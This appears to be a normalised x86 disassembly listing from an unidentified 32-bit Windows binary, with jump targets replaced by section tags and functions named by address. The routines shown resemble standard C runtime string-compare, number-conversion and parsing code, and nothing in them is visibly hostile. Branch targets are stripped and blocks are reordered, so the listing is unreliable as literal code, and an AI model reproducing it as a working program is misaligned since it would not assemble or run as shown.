xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x10 ]
cmp esi [ ecx + 0x10 ]
je r-xdata
movzx esi [ eax + 0xd ]
movzx ebx [ ecx + 0xd ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0xb ]
movzx ebx [ ecx + 0xb ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx ebx [ ecx + 0x10 ]
movzx esi [ eax + 0x10 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xe ]
movzx ebx [ ecx + 0xe ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x14 ]
cmp esi [ ecx + 0x14 ]
je r-xdata
movzx esi [ eax + 0x11 ]
movzx ebx [ ecx + 0x11 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0xf ]
movzx ebx [ ecx + 0xf ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x14 ]
movzx ebx [ ecx + 0x14 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x12 ]
movzx ebx [ ecx + 0x12 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x18 ]
cmp esi [ ecx + 0x18 ]
je r-xdata
movzx esi [ eax + 0x15 ]
movzx ebx [ ecx + 0x15 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x13 ]
movzx ebx [ ecx + 0x13 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x18 ]
movzx ebx [ ecx + 0x18 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x16 ]
movzx ebx [ ecx + 0x16 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x1c ]
cmp esi [ ecx + 0x1c ]
je r-xdata
movzx esi [ eax + 0x19 ]
movzx ebx [ ecx + 0x19 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x17 ]
movzx ebx [ ecx + 0x17 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x1c ]
movzx ebx [ ecx + 0x1c ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x1a ]
movzx ebx [ ecx + 0x1a ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
add eax edx
add ecx edx
sub edi edx
movzx esi [ eax + 0x1d ]
movzx ebx [ ecx + 0x1d ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x1b ]
movzx ebx [ ecx + 0x1b ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x1e ]
movzx ebx [ ecx + 0x1e ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
movzx esi [ eax + 0x1f ]
movzx ebx [ ecx + 0x1f ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
sub_445df2
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
push esi
cmp ebx 0x4
jb r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
lea esi [ ebx - 0x4 ]
test esi esi
je r-xdata
pop ebx
leave
retn
cmp esi ebx
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov dl [ eax ]
test dl dl
je r-xdata
xor eax eax
movzx eax [ eax - 0x4 ]
movzx ecx [ ecx - 0x4 ]
jmp r-xdata
cmp dl [ ecx - 0x4 ]
jne r-xdata
movzx eax [ eax ]
movzx ecx [ ecx ]
cmp dl [ ecx ]
jne r-xdata
sub eax ecx
jmp r-xdata
mov dl [ eax - 0x3 ]
test dl dl
je r-xdata
pop esi
inc eax
inc esi
inc ecx
movzx eax [ eax - 0x3 ]
movzx ecx [ ecx - 0x3 ]
jmp r-xdata
cmp dl [ ecx - 0x3 ]
jne r-xdata
mov dl [ eax - 0x2 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x2 ]
movzx ecx [ ecx - 0x2 ]
jmp r-xdata
cmp dl [ ecx - 0x2 ]
jne r-xdata
mov dl [ eax - 0x1 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
jmp r-xdata
cmp dl [ ecx - 0x1 ]
jne r-xdata
add [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x4 ] esi
jb r-xdata
mov dl [ eax ]
add eax 0x4
add ecx 0x4
test dl dl
je r-xdata
jmp r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
sub_445ec0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_445f00
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0x10 ]
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x4 ] 0x404e
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
cmp [ ebp + 0xc ] ebx
jbe r-xdata
cmp [ eax + 0x8 ] ebx
jne r-xdata
xor ecx ecx
mov [ ebp + 0x10 ] ebx
mov edi [ eax + 0x8 ]
test edi 0x8000
jne r-xdata
mov edx [ eax + 0x4 ]
mov [ ebp + 0x10 ] 0x1
cmp edx [ ebp - 0x18 ]
jae r-xdata
mov cx [ ebp - 0x4 ]
pop edi
pop esi
mov [ eax + 0xa ] cx
pop ebx
leave
retn
mov ecx [ eax + 0x4 ]
mov ecx [ eax ]
add [ ebp - 0x4 ] 0xfff0
mov edi edx
mov esi ecx
shr esi 0x10
shl edx 0x10
shr edi 0x10
or edx esi
shl ecx 0x10
mov [ eax + 0x4 ] edx
mov [ eax ] ecx
cmp edi ebx
je r-xdata
mov [ eax + 0x8 ] edi
mov esi [ ebp - 0x14 ]
and [ ebp + 0x10 ] 0x0
lea ebx [ edi + esi ]
cmp ebx edi
jb r-xdata
mov esi [ ebp - 0x8 ]
and [ ebp + 0x10 ] 0x0
lea edi [ esi + 0x1 ]
cmp edi esi
jb r-xdata
cmp [ ebp + 0x10 ] 0x0
mov [ eax ] edx
je r-xdata
mov ebx [ eax ]
add [ ebp - 0x4 ] 0xffff
mov esi ecx
mov edx ebx
shr esi 0x1f
add edi edi
shr edx 0x1f
add ecx ecx
or edi esi
add ebx ebx
or ecx edx
mov [ eax ] ebx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] edi
test edi 0x8000
je r-xdata
mov [ ebp + 0x10 ] 0x1
cmp ebx esi
jae r-xdata
mov [ ebp + 0x10 ] 0x1
cmp edi 0x1
jae r-xdata
add ecx [ ebp - 0x10 ]
and [ ebp - 0x8 ] 0x0
mov edi ebx
add ecx ecx
mov esi edx
shr edi 0x1f
or ecx edi
shr esi 0x1f
add ebx ebx
add edx edx
or ebx esi
mov [ eax + 0x8 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp + 0x10 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
movsx esi [ ecx ]
lea ecx [ edx + esi ]
mov [ ebp - 0x18 ] esi
cmp ecx edx
jb r-xdata
inc ecx
mov [ eax + 0x8 ] ecx
cmp [ ebp + 0x10 ] 0x0
mov [ eax + 0x4 ] ebx
je r-xdata
inc ecx
mov [ eax + 0x8 ] ecx
cmp [ ebp + 0x10 ] 0x0
mov [ eax + 0x4 ] edi
je r-xdata
mov [ ebp - 0x8 ] 0x1
cmp ecx esi
jae r-xdata
dec [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
inc [ ebp + 0x8 ]
cmp [ ebp + 0xc ] 0x0
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] edx
ja r-xdata
lea edx [ ebx + 0x1 ]
xor esi esi
cmp edx ebx
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
mov [ eax ] ecx
je r-xdata
mov esi eax
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edx ecx
lea edi [ ecx + ecx ]
shr edx 0x1f
lea ecx [ ebx + ebx ]
or ecx edx
mov edx [ ebp + 0x10 ]
and [ ebp + 0x10 ] 0x0
mov esi ebx
mov ebx ecx
mov [ ebp - 0x8 ] edi
shr esi 0x1f
add edx edx
or edx esi
mov esi [ ebp - 0x8 ]
add ecx ecx
shr edi 0x1f
or ecx edi
mov edi ecx
mov [ ebp - 0x8 ] ecx
lea ecx [ edx + edx ]
mov edx [ ebp - 0x18 ]
add esi esi
shr ebx 0x1f
or ecx ebx
add edx esi
mov [ eax ] esi
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] ecx
cmp edx esi
jb r-xdata
xor ebx ebx
xor esi esi
inc esi
cmp edx 0x1
jae r-xdata
mov edx [ ebp - 0xc ]
inc edx
mov [ ebp + 0x10 ] edx
mov [ eax + 0x8 ] edx
mov ebx edx
mov [ eax + 0x4 ] edx
test esi esi
je r-xdata
sub_4460e4
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
movzx ecx [ edx ]
lea edi [ ecx - 0x41 ]
inc edx
cmp edi 0x19
ja r-xdata
add eax 0x20
test eax eax
je r-xdata
add ecx 0x20
pop edi
sub eax ecx
pop esi
pop ebp
retn
cmp eax ecx
je r-xdata
movzx eax [ esi ]
lea ecx [ eax - 0x41 ]
inc esi
cmp ecx 0x19
ja r-xdata
sub_44611d
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_42b774
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
call sub_4268f3
mov [ eax ] 0x16
call sub_42970c
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
call sub_4268f3
mov [ eax ] 0x16
call sub_42970c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub ebx esi
push edi
push esi
push ebx
call sub_4460e4
pop ecx
pop ecx
jmp r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
sub edi eax
mov eax edi
pop edi
cmp edi eax
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
movzx eax [ ebx + esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_438457
mov edi eax
movzx eax [ esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_438457
add esp 0x10
inc esi
test edi edi
je r-xdata
sub_4461dd
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ rw-data ] eax
jne r-xdata
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_44611d
add esp 0xc
pop ebp
retn
cmp [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebp + 0xc ] eax
je r-xdata
call sub_4268f3
mov [ eax ] 0x16
call sub_42970c
mov eax 0x7fffffff
pop ebp
retn
pop ebp
jmp sub_4460e4
sub_446224
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
cmp [ ebp + 0x10 ] 0x0
push ebx
push esi
push edi
je r-xdata
xor eax eax
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_42b774
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
call sub_4268f3
mov [ eax ] 0x16
call sub_42970c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edi 0x7fffffff
cmp [ ebp + 0x10 ] edi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
call sub_4268f3
mov [ eax ] 0x16
call sub_42970c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub ebx esi
push [ ebp + 0x10 ]
push esi
push ebx
call sub_4465c0
add esp 0xc
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub edi eax
mov eax edi
jmp r-xdata
test edi edi
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp edi eax
je r-xdata
movzx eax [ ebx + esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_438457
mov edi eax
movzx eax [ esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_438457
add esp 0x10
inc esi
dec [ ebp + 0x10 ]
je r-xdata
sub_446306
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ rw-data ] eax
jne r-xdata
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_446224
add esp 0x10
pop ebp
retn
cmp [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebp + 0xc ] eax
je r-xdata
call sub_4268f3
mov [ eax ] 0x16
call sub_42970c
mov eax 0x7fffffff
pop ebp
retn
cmp [ ebp + 0x10 ] 0x7fffffff
ja r-xdata
pop ebp
jmp sub_4465c0
sub_446359
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
xor ebx ebx
cmp esi ebx
jne r-xdata
push edi
cmp [ ebp + 0x8 ] ebx
ja r-xdata
call sub_4268f3
push 0x16
pop esi
mov [ eax ] esi
call sub_42970c
mov eax esi
jmp r-xdata
xor ecx ecx
cmp [ ebp + 0x10 ] ebx
mov [ esi ] bl
setne cl
inc ecx
cmp [ ebp + 0x8 ] ecx
ja r-xdata
call sub_4268f3
push 0x16
pop esi
pop ebx
pop ebp
retn 0xc
mov ecx [ ebp + 0xc ]
add ecx 0xfffffffe
cmp ecx 0x22
ja r-xdata
call sub_4268f3
push 0x22
jmp r-xdata
pop edi
mov ecx esi
cmp [ ebp + 0x10 ] ebx
je r-xdata
pop esi
mov [ eax ] esi
call sub_42970c
mov eax esi
jmp r-xdata
mov edi ecx
xor ebx ebx
inc ebx
mov [ esi ] 0x2d
lea ecx [ esi + 0x1 ]
neg eax
add dl 0x30
add dl 0x57
jmp r-xdata
cmp ebx [ ebp + 0x8 ]
jb r-xdata
cmp ebx [ ebp + 0x8 ]
jb r-xdata
mov [ ecx ] dl
inc ecx
inc ebx
test eax eax
je r-xdata
mov [ ecx ] 0x0
dec ecx
mov [ esi ] 0x0
jmp r-xdata
xor edx edx
div [ ebp + 0xc ]
cmp edx 0x9
jbe r-xdata
mov dl [ edi ]
mov al [ ecx ]
mov [ ecx ] dl
dec ecx
mov [ edi ] al
inc edi
cmp edi ecx
jb r-xdata
xor eax eax
sub_446413
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0xa
mov eax [ ebp + 0x8 ]
jne r-xdata
push 0x0
push [ ebp + 0x14 ]
test eax eax
jns r-xdata
push 0x1
push 0xa
jmp r-xdata
push [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
call sub_446359
pop ebp
retn
sub_44643d
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x14 ] 0xa
jne r-xdata
mov ecx [ ebp + 0xc ]
push eax
push [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0x10 ]
call sub_446359
pop ebp
retn
cmp [ ebp + 0x8 ] eax
jge r-xdata
inc eax
sub_44647e
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
xor ecx ecx
push esi
cmp edi ecx
jne r-xdata
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
call sub_4268f3
push 0x16
xor eax eax
cmp [ ebp + 0x18 ] ecx
mov [ edi ] cl
setne al
inc eax
cmp [ ebp + 0x10 ] eax
ja r-xdata
pop esi
leave
retn 0x14
mov eax [ ebp + 0x14 ]
add eax 0xfffffffe
cmp eax 0x22
ja r-xdata
call sub_4268f3
push 0x22
jmp r-xdata
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ecx
mov esi edi
cmp [ ebp + 0x18 ] ecx
je r-xdata
pop esi
mov [ eax ] esi
mov [ ebp + 0x18 ] esi
mov [ ebp + 0xc ] ecx
neg ebx
adc eax ecx
mov [ edi ] 0x2d
lea esi [ edi + 0x1 ]
mov [ ebp - 0x4 ] 0x1
neg eax
add cl 0x30
add cl 0x57
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
jb r-xdata
test ebx ebx
je r-xdata
mov [ esi ] cl
mov ecx [ ebp - 0x4 ]
inc esi
inc ecx
mov [ ebp - 0x4 ] ecx
test eax eax
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x14 ]
push eax
push ebx
call sub_437480
mov [ ebp - 0x8 ] ebx
mov ebx eax
mov eax edx
cmp ecx 0x9
jbe r-xdata
mov ecx [ ebp - 0x4 ]
pop ebx
cmp ecx [ ebp + 0x10 ]
jb r-xdata
mov [ esi ] 0x0
dec esi
mov [ edi ] 0x0
call sub_4268f3
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov dl [ eax ]
mov cl [ esi ]
mov [ esi ] dl
dec esi
mov [ eax ] cl
inc eax
mov [ ebp + 0x18 ] eax
cmp eax esi
jb r-xdata
xor eax eax
call sub_42970c
mov eax esi
jmp r-xdata
sub_44656a
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x18 ] 0xa
jne r-xdata
push edi
mov edi [ ebp + 0x10 ]
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_44647e
pop edi
pop ebp
retn
cmp [ ebp + 0xc ] eax
jg r-xdata
jl r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x8 ] eax
jae r-xdata
sub_44659f
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x10 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_44647e
pop edi
pop ebp
retn
sub_4465c0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_446621
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push esi
push edi
test eax eax
jne r-xdata
mov esi [ eax ]
mov edi [ eax + 0x4 ]
call sub_442adc
mov esi [ eax + 0x8 ]
call sub_442a90
mov edi eax
jmp r-xdata
and [ ebp + 0x14 ] 0x0
push edi
call sub_447c28
pop ecx
lea ecx [ ebp + 0x14 ]
push ecx
push 0x0
push eax
call sub_442a74
pop ecx
push eax
push [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
push 0x1
push eax
push 0x0
push edi
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov ax [ ebp + 0xc ]
mov ecx 0xff
cmp ax cx
ja r-xdata
test esi esi
jne r-xdata
call sub_4268f3
mov [ eax ] 0x2a
or eax 0xffffffff
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx ] al
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
pop ebp
retn
sub_4466c9
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ebx [ ebp + 0x8 ]
movzx eax [ ebx ]
mov esi ebx
jmp r-xdata
lea edi [ ebp + 0x8 ]
push eax
call sub_4380e7
pop ecx
test eax eax
jne r-xdata
inc esi
movzx eax [ esi ]
mov al [ esi ]
cmp al 0x2d
je r-xdata
mov [ ebp + 0xf ] al
inc esi
cmp al 0x2b
je r-xdata
mov esi 0x7fffffff
cmp ebx [ edi ]
jne r-xdata
mov [ edi ] ebx
mov [ ebp + 0xf ] 0x2b
jmp r-xdata
cmp [ ebp + 0xf ] 0x2b
jne r-xdata
test eax eax
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push edi
push esi
call sub_4479aa
add esp 0x10
cmp esi [ edi ]
jne r-xdata
cmp [ ebp + 0xf ] 0x2d
jne r-xdata
cmp eax esi
ja r-xdata
call sub_4268f3
mov [ eax ] 0x22
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp eax 0x80000000
jbe r-xdata
xor eax eax
cmp [ ebp + 0xf ] 0x2d
sete al
add eax esi
jmp r-xdata
mov [ eax ] 0x1
neg eax
sub_44678f
mov edi edi
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_4467d5
mov edi edi
push ebp
mov ebp esp
mov edx [ ecx + 0x4 ]
mov eax [ ebp + 0x8 ]
cmp edx [ eax + 0x4 ]
jne r-xdata
xor eax eax
mov ecx [ ecx ]
cmp ecx [ eax ]
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebp
retn 0x4
sub_44680a
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0xc ]
mov eax [ ecx ]
push [ ebp + 0x8 ]
lea edx [ ebp - 0x8 ]
push edx
call [ eax + 0xc ]
mov ecx eax
call sub_4467d5
leave
retn 0x8
sub_44682b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp ecx [ eax + 0x4 ]
jne r-xdata
xor eax eax
mov eax [ eax ]
cmp eax [ ebp + 0xc ]
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebp
retn 0x8
sub_4468c8
mov edi edi
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_4468ea
mov edi edi
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_44690c
mov edi edi
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_424fc7
pop ecx
sub_44692e
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
call sub_4486c7
pop ecx
